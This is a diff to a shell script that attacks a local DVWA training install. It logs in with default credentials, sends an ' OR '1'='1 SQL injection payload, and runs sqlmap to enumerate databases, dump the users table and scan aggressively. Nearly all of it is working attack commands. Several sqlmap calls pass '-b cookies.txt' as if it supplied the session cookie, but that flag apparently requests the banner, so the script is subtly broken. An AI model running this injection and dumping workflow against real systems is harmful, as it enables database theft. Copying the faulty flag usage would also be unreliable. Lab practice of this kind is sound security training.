@@ -1,2 +1,22 @@
 curl -s -c cookies.txt -d "username=admin&password=password&Login=Login" "http://127.0.0.1/dvwa/login.php" > /dev/null
 grep -i PHPSESSID cookies.txt || cat cookies.txt
+
+curl -s -I -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" | sed -n '1,8p'
+
+curl -s -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit" -o /tmp/sqli_test.html
+xdg-open /tmp/sqli_test.html 2>/dev/null || echo "Saved /tmp/sqli_test.html — open in VM browser"
+
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  -b cookies.txt -p id --batch --level=3 --risk=2 --dbs | tee sqlmap-dbs.txt
+
+# list tables
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  -b cookies.txt -p id --batch -D dvwa --tables | tee sqlmap-tables.txt
+
+# dump users table (if users table exists)
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  -b cookies.txt -p id --batch -D dvwa -T users --dump | tee sqlmap-users.txt
+
+SESSION=$(grep PHPSESSID cookies.txt | awk '{print $7}')
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=${SESSION}; security=low" -p id --batch --level=5 --risk=3 --technique=BEU --dbs | tee sqlmap-aggressive.txt
